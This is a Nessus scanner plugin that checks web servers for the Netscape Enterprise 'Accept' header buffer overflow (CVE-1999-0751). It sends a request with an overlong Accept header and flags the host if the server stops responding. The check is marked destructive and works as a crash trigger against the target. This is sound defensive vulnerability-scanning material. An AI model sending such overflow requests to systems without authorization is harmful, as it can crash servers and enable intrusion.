#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10154);
 script_bugtraq_id(631);
 script_version ("$Revision: 1.19 $");
 script_cve_id("CVE-1999-0751");
 name["english"] = "Netscape Enterprise 'Accept' buffer overflow";
 name["francais"] = "Dépassement de buffer Netscape Enterprise 'Accept'";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
The remote web server seems to crash when it is issued
a too long argument to the 'Accept:' command :

Example :

		GET / HTTP/1.0
		Accept: <thousands of chars>/gif
		

This may allow an attacker to execute arbitrary code on
the remote system.

Solution : Contact your vendor for a patch.

Risk factor : High";


 desc["francais"] = "
Le serveur web distant semble planter lorsqu'il recoit un
argument trop long pour la commande 'Accept' tel
que :

		GET / HTTP/1.0
		Accept: <des milliers de caractères ici>/gif
		
Ce problème peut permettre à un pirate d'executer du
code arbitraire sur la machine distante.

Solution : contactez votre vendeur pour un patch.

Facteur de risque : Elevé";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Accept overflow";
 summary["francais"] = "Overflow de Accept";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Gain a shell remotely";
 family["francais"] = "Obtenir un shell à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/iplanet");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = get_http_port(default:80);

if(get_port_state(port))
{
  if(http_is_dead(port:port))exit(0);


  soc = http_open_socket(port);
 if(soc)
 {
  d = string("GET / HTTP/1.0\r\nAccept: ", crap(2000), "/gif\r\n\r\n");
  send(socket:soc, data:d);
  r = http_recv(socket:soc);
  if(!r)security_hole(port);
  http_close_socket(soc);
 }
}
